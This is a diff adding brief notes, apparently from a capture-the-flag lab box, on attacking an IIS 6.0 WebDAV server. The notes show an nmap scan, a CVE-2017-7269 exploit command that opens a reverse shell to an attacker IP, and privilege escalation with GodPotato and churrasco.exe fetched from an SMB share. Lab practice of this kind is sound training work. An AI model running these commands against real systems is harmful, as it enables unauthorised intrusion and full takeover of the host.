@@ -1,0 +1,33 @@
+└─$ nmap -A 10.10.10.14 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-07 21:13 CEST
+Nmap scan report for 10.10.10.14
+Host is up (0.047s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+|_http-server-header: Microsoft-IIS/6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+| http-webdav-scan: 
+|   Server Date: Wed, 07 Aug 2024 19:15:00 GMT
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Server Type: Microsoft-IIS/6.0
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|_  WebDAV type: Unknown
+|_http-title: Under Construction
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
+python iis6\ reverse\ shell 10.10.10.14 80 10.10.14.17 1234
+
+whoami /all
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+
+impacket-smbserver -smb2support files . 
+copy \\10.10.14.17\files\GodPotato-NET4.exe
+copy \\10.10.14.17\files\churrasco.exe
+churrasco.exe -d "cmd.exe"
+
+
